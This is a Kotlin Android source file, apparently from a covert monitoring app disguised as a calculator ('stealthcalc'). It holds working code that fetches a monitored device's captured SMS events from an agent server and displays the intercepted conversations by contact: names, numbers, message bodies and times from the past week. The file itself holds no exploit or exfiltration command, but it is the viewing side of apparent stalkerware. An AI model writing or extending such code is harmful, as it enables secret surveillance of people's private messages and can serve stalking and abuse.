package com.stealthcalc.monitoring.ui

import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Person
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.EventPayload
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject

data class SmsContact(
    val address: String,
    val contactName: String?,
    val lastMessage: String,
    val lastDate: Long,
    val messageCount: Int,
)

data class SmsMessage(
    val body: String,
    val type: String,
    val date: Long,
)

data class SmsConversationState(
    val isLoading: Boolean = false,
    val contacts: List<SmsContact> = emptyList(),
    val selectedContact: SmsContact? = null,
    val messages: List<SmsMessage> = emptyList(),
)

@HiltViewModel
class SmsConversationViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val json = Json { ignoreUnknownKeys = true }
    private val _state = MutableStateFlow(SmsConversationState())
    val state: StateFlow<SmsConversationState> = _state.asStateFlow()
    private var allSmsEvents: List<EventPayload> = emptyList()

    init { load() }

    fun load() {
        viewModelScope.launch {
            _state.value = SmsConversationState(isLoading = true)
            val events = apiClient.getEvents(
                repository.deviceId,
                since = System.currentTimeMillis() - 7 * 24 * 3600 * 1000L
            )
            allSmsEvents = events.filter { it.kind == "SMS" }

            val grouped = mutableMapOf<String, MutableList<EventPayload>>()
            for (event in allSmsEvents) {
                val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull() ?: continue
                val address = obj["address"]?.jsonPrimitive?.content ?: continue
                grouped.getOrPut(address) { mutableListOf() }.add(event)
            }

            val contacts = grouped.map { (address, events) ->
                val last = events.maxByOrNull { it.capturedAt }
                val lastObj = last?.let { runCatching { json.parseToJsonElement(it.payload).jsonObject }.getOrNull() }
                SmsContact(
                    address = address,
                    contactName = lastObj?.get("contactName")?.jsonPrimitive?.content,
                    lastMessage = lastObj?.get("body")?.jsonPrimitive?.content ?: "",
                    lastDate = last?.capturedAt ?: 0,
                    messageCount = events.size,
                )
            }.sortedByDescending { it.lastDate }

            _state.value = SmsConversationState(contacts = contacts)
        }
    }

    fun selectContact(contact: SmsContact) {
        val messages = allSmsEvents.mapNotNull { event ->
            val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull() ?: return@mapNotNull null
            val address = obj["address"]?.jsonPrimitive?.content ?: return@mapNotNull null
            if (address != contact.address) return@mapNotNull null
            SmsMessage(
                body = obj["body"]?.jsonPrimitive?.content ?: "",
                type = obj["type"]?.jsonPrimitive?.content ?: "INBOX",
                date = event.capturedAt,
            )
        }.sortedBy { it.date }

        _state.value = _state.value.copy(selectedContact = contact, messages = messages)
    }

    fun clearSelection() {
        _state.value = _state.value.copy(selectedContact = null, messages = emptyList())
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SmsConversationScreen(
    onBack: () -> Unit,
    viewModel: SmsConversationViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(state.selectedContact?.let { it.contactName ?: it.address } ?: "SMS Conversations")
                },
                navigationIcon = {
                    IconButton(onClick = {
                        if (state.selectedContact != null) viewModel.clearSelection() else onBack()
                    }) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        if (state.selectedContact != null) {
            LazyColumn(
                modifier = Modifier.fillMaxSize().padding(padding).padding(horizontal = 16.dp),
                verticalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                item { Spacer(modifier = Modifier.height(4.dp)) }
                items(state.messages) { msg ->
                    val isInbox = msg.type == "INBOX"
                    Card(
                        modifier = Modifier.fillMaxWidth(if (isInbox) 0.85f else 1f).let {
                            if (!isInbox) it.padding(start = 40.dp) else it
                        },
                        colors = CardDefaults.cardColors(
                            containerColor = if (isInbox) MaterialTheme.colorScheme.surfaceVariant
                            else MaterialTheme.colorScheme.primaryContainer
                        )
                    ) {
                        Column(modifier = Modifier.padding(10.dp)) {
                            Text(msg.body, style = MaterialTheme.typography.bodyMedium)
                            Text(
                                formatTimeSms(msg.date),
                                style = MaterialTheme.typography.labelSmall,
                                color = MaterialTheme.colorScheme.onSurface.copy(alpha = 0.4f)
                            )
                        }
                    }
                }
                item { Spacer(modifier = Modifier.height(16.dp)) }
            }
        } else {
            LazyColumn(
                modifier = Modifier.fillMaxSize().padding(padding).padding(horizontal = 16.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp),
            ) {
                item { Spacer(modifier = Modifier.height(4.dp)) }
                items(state.contacts) { contact ->
                    Card(
                        modifier = Modifier.fillMaxWidth().clickable { viewModel.selectContact(contact) },
                        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                    ) {
                        Row(
                            modifier = Modifier.padding(12.dp),
                            verticalAlignment = Alignment.CenterVertically,
                        ) {
                            Icon(Icons.Default.Person, null, Modifier.size(32.dp), tint = MaterialTheme.colorScheme.primary)
                            Column(modifier = Modifier.weight(1f).padding(start = 12.dp)) {
                                Text(
                                    contact.contactName ?: contact.address,
                                    style = MaterialTheme.typography.titleSmall,
                                )
                                Text(
                                    contact.lastMessage,
                                    style = MaterialTheme.typography.bodySmall,
                                    maxLines = 1,
                                    overflow = TextOverflow.Ellipsis,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.6f)
                                )
                            }
                            Column(horizontalAlignment = Alignment.End) {
                                Text("${contact.messageCount}", style = MaterialTheme.typography.labelMedium, color = MaterialTheme.colorScheme.primary)
                                Text(
                                    formatTimeSms(contact.lastDate),
                                    style = MaterialTheme.typography.labelSmall,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.4f)
                                )
                            }
                        }
                    }
                }
                item { Spacer(modifier = Modifier.height(16.dp)) }
            }
        }
    }
}

private fun formatTimeSms(ms: Long): String {
    val sdf = java.text.SimpleDateFormat("MMM d, h:mm a", java.util.Locale.US)
    return sdf.format(java.util.Date(ms))
}
